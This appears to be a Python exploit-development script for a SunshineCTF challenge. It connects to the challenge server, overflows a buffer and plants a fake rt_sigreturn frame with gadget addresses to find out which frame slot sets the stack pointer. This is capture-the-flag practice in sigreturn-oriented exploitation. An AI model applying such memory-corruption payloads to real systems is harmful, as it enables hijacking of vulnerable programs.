#!/usr/bin/env python3
"""Find which frame slot rt_sigreturn actually loads into RSP.

rip is honoured at frame+0x28+0x80 but sigcontext+0x78 is not being used for rsp,
so stop guessing the struct and measure it.  Every candidate slot gets a pointer to
a different 8-byte-aligned address inside the two mapped file pages (0x400000 holds
the ELF headers, 0x401000 the code), whose contents are known exactly from the file.
The frame's first 8 bytes are left zero, so the "kernel ignored rsp" case shows up
as its own distinct answer.

The 8 bytes that come back are the content at whichever pointer was loaded into rsp,
which identifies the slot directly.
"""
import socket
import struct
import time

HOST = "chal.sunshinectf.games"
PORT = 26003
G1, SC, LEAK = 0x401032, 0x401069, 0x401017
FRAME_AT, B, FRAME_LEN = 0x90, 0x28, 0x28 + 0xC0
SPECIAL = {B + 0x80: LEAK, B + 0x88: 0x246, B + 0x90: 0x33 | (0x2B << 48),
           B + 0xA8: 0, B + 0xB0: 0}

data = open("../files/total_recall", "rb").read()


def mem_at(addr, n=8):
    if 0x400000 <= addr < 0x4000b0:
        return data[addr - 0x400000: addr - 0x400000 + n]
    if 0x401000 <= addr < 0x40106c:
        return data[0x1000 + (addr - 0x401000): 0x1000 + (addr - 0x401000) + n]
    raise ValueError(hex(addr))


pool = []
for a in range(0x400000, 0x4000a9, 4):
    pool.append(a)
for a in range(0x401000, 0x401065, 4):
    pool.append(a)
seen = {}
for a in pool:
    seen.setdefault(mem_at(a).hex(), []).append(hex(a))
dupes = {k: v for k, v in seen.items() if len(v) > 1}
print("pool=%d unique=%d dupes=%s" % (len(pool), len(seen), list(dupes.values())[:3]))
uniq = [a for a in pool if len(seen[mem_at(a).hex()]) == 1]

slots = [o for o in range(0, FRAME_LEN, 8) if o not in SPECIAL]
assert len(uniq) >= len(slots), (len(uniq), len(slots))
assign = dict(zip(slots, uniq))
expect = {mem_at(uniq[i]).hex(): FRAME_AT + slots[i] for i in range(len(slots))}
expect[b"\x00" * 8] = None      # rsp untouched -> reads the frame's own zero head


def recvn(s, n, t=4.0):
    s.settimeout(t)
    b = b""
    while len(b) < n:
        try:
            c = s.recv(n - len(b))
        except socket.timeout:
            break
        if not c:
            break
        b += c
    return b


def drain(s, t=2.0):
    s.settimeout(t)
    b = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            b += c
    except socket.timeout:
        pass
    return b


s = socket.create_connection((HOST, PORT), timeout=20)
try:
    L = struct.unpack("<Q", recvn(s, 8))[0]
    buf = L - 0x78
    body = bytearray(b"\x90" * (FRAME_AT + FRAME_LEN))
    struct.pack_into("<Q", body, 0x80, G1)
    struct.pack_into("<Q", body, 0x88, SC)
    f = bytearray(FRAME_LEN)
    for off, val in SPECIAL.items():
        struct.pack_into("<Q", f, off, val)
    for off, addr in assign.items():
        struct.pack_into("<Q", f, off, addr)
    body[FRAME_AT:FRAME_AT + FRAME_LEN] = f
    print("[+] frame=%#x body=%d bytes" % (buf + FRAME_AT, len(body)))
    s.sendall(b"\x90" * 24 + bytes(body))
    time.sleep(0.5)
    pre = drain(s, 0.3)
    s.sendall(b"Z" * 15)
    time.sleep(0.5)
    got = pre + drain(s, 2.5)
    print("[*] got %d bytes: %s" % (len(got), got[:16].hex()))
    if len(got) >= 8:
        k = got[:8].hex()
        if k in expect:
            print("[!] rsp came from frame offset %s" % (
                "0x%x" % expect[k] if expect[k] is not None else
                "NONE (kernel kept its own rsp)"))
        else:
            print("[?] unknown content %r - not in the assigned set" % got[:8])
            for off, addr in sorted(assign.items()):
                print("      frame+0x%02x -> %#x" % (off, addr))
finally:
    s.close()
